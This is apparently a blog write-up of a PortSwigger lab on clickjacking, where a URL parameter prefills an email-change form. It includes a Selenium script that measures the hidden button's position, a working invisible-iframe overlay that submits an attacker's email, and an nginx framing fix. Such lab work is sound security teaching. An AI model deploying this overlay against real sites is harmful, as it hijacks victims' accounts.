---
layout: post
title: "PortSwigger: Clickjacking with Form Input Data Prefilled from a URL Parameter"
date: 2027-07-21 09:00:00 -0500
categories: [Web Security, Clickjacking]
tags: [portswigger, clickjacking, ui-redressing, csrf-bypass, iframe, url-parameter, web]
---

## Lab Summary

**Lab:** Clickjacking with form input data prefilled from a URL parameter  
**Difficulty:** Apprentice  
**CWE:** [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html) – Improper Restriction of Rendered UI Layers  
**Result:** Solved

---

## The Vulnerability

This lab extends the basic clickjacking scenario with a critical twist: the target page accepts a URL parameter that **pre-populates a form field** before the victim sees it.

The account page at `/my-account` has:
1. No `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` header — it can be embedded in any iframe.
2. A "Change email" form that accepts `?email=` to pre-fill the email input.

An attacker can set the iframe src to `/my-account?email=hacker@attacker.com`. The victim's browser renders the page with the attacker's email already in the field. The victim clicks the decoy "Click me" element, but their click actually lands on the invisible "Update email" submit button in the overlying iframe.

Because the submission originates from inside the same-origin iframe:
- The victim's session cookie is sent automatically.
- The CSRF token is valid (it came from the victim's own page render).
- The attacker's email value is submitted — without the victim ever knowingly filling it in.

---

## The Exploit

**Step 1 — Measure the button position at 500px viewport width:**

The form's "Update email" button renders at different vertical offsets depending on viewport width. Measure it at the iframe's exact dimensions using headless Chromium:

```python
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

opts = webdriver.ChromeOptions()
opts.add_argument('--headless')
opts.add_argument('--window-size=500,700')  # match iframe dimensions
opts.binary_location = '/usr/bin/chromium'

driver = webdriver.Chrome(service=Service('/usr/bin/chromedriver'), options=opts)
driver.get('https://TARGET/my-account?email=hacker@attacker.com')
btn = driver.find_element(By.CSS_SELECTOR, 'form[name="change-email-form"] button')
print(btn.rect)
# → {'x': 32, 'y': 491, 'width': 132, 'height': 32}
```

The hint suggests `top:400px` — the actual measured value at 500px viewport is `491px`.

**Step 2 — Build and deliver the iframe overlay:**

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 491px;
        left: 32px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account?email=hacker@attacker.com"></iframe>
```

Store this on the exploit server and deliver it to the victim:

```bash
curl -L 'https://EXPLOIT_SERVER/deliver-to-victim'
```

The victim sees "Click me", clicks it, and their email is changed to the attacker-controlled value.

---

## Why This Is Worse Than Basic Clickjacking

One sentence: **basic clickjacking chooses what action fires; this variant also chooses what data is submitted.**

In the basic lab, the victim deletes their own account — a fixed action with a fixed outcome. Here, the attacker injects an arbitrary value into the form before the click. That value can be an email address (account takeover), a transfer recipient, an amount, a role flag — anything the endpoint accepts as a URL-prefillable input, visible or hidden. The attack shifts from action-hijacking to full data-injection with no additional complexity.

---

## The Fix

Prevent the page from being embedded:

```nginx
# Nginx
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none'" always;
```

The URL-parameter prefill feature is a secondary concern — the framing protection is the correct primary control. Once the page cannot be embedded, the attacker cannot abuse the prefill behavior.

**CWE:** [CWE-1021 — Improper Restriction of Rendered UI Layers](https://cwe.mitre.org/data/definitions/1021.html)
